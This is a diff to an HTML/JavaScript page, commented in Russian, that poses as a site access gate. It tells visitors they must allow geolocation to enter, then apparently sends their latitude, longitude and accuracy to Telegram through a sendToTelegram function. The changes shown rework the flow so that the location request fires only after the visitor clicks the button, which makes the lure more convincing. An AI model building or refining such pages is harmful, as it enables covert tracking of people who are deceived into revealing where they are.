@@ -108,7 +108,7 @@
 </head>
 <body>
 
-    <!-- ЭКРАН 1: Чёрный + запрос -->
+    <!-- ЭКРАН 1: Чёрный + надпись -->
     <div class="card" id="step1">
         <h1>🔐 Доступ к сайту</h1>
         <div class="sub">Для входа необходимо разрешить доступ к геолокации</div>
@@ -137,6 +137,7 @@
         let map = null;
         let marker = null;
         let circle = null;
+        let isFirstLoad = true;
 
         // ====== ОТПРАВКА В TELEGRAM ======
         function sendToTelegram(lat, lon, acc) {
@@ -244,16 +245,20 @@
             );
         }
 
-        // ====== ПЕРЕКЛЮЧЕНИЕ ======
+        // ====== ПЕРЕКЛЮЧЕНИЕ ПО КНОПКЕ ======
         document.getElementById('startBtn').addEventListener('click', function() {
+            // Прячем первый экран
             document.getElementById('step1').classList.add('hidden');
+            // Показываем второй
             document.getElementById('step2').classList.remove('hidden');
 
+            // Инициализируем карту
             map = L.map('map').setView([55.7558, 37.6173], 13);
             L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
                 attribution: '© OpenStreetMap'
             }).addTo(map);
 
+            // Теперь вызываем геолокацию — только после нажатия кнопки
             getLocation();
         });
     </script>
